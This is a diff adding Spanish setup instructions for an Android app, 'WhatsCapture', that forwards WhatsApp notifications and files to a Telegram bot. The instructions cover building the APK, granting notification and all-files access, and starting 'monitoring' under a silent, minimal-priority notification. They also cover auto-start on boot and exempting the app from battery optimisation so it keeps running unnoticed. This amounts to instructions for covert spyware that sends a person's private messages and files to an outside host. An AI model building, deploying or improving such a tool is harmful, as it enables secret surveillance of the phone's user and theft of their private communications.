@@ -1,0 +1,40 @@
+=== WHATSCAPTURE - INSTRUCCIONES ===
+
+App configurada para enviar notificaciones y archivos de WhatsApp
+al bot de Telegram: @whats_prueba_bot
+
+--- COMPILACIÓN ---
+1. Abre Android Studio
+2. File > Open > selecciona la carpeta WhatsAppCapture
+3. Espera que Gradle sincronice
+4. Conecta tu teléfono Android con depuración USB
+5. Presiona Run (triángulo verde)
+6. El APK se genera en: app/build/outputs/apk/debug/
+
+--- USO EN EL TELÉFONO ---
+Al abrir la app:
+
+1. Presiona "Acceso a Notificaciones"
+   → Activa "Permitir acceso a notificaciones" para WhatsCapture
+
+2. Presiona "Acceso a Archivos"
+   → Android 11+: Activa "Permitir acceso a todos los archivos"
+   → Android 10-: Concede permiso de almacenamiento
+
+3. Presiona "INICIAR MONITOREO"
+   → Aparece notificación silenciosa "WhatsCapture activo"
+   → Listo. Todo llega al bot de Telegram automáticamente
+
+--- NOTIFICACIÓN DEL SERVICIO ---
+Android 8+ OBLIGA a mostrar una notificación por servicios en segundo plano.
+La de WhatsCapture:
+- Sin sonido, sin vibración, sin popup
+- Prioridad mínima
+- No se puede ocultar sin root
+
+--- AUTO-INICIO ---
+La app se inicia sola al encender el teléfono.
+
+--- SI DEJA DE FUNCIONAR ---
+El sistema puede matar el servicio por ahorro de batería.
+Solución: Ajustes > Batería > Optimización > WhatsCapture > Sin optimizar
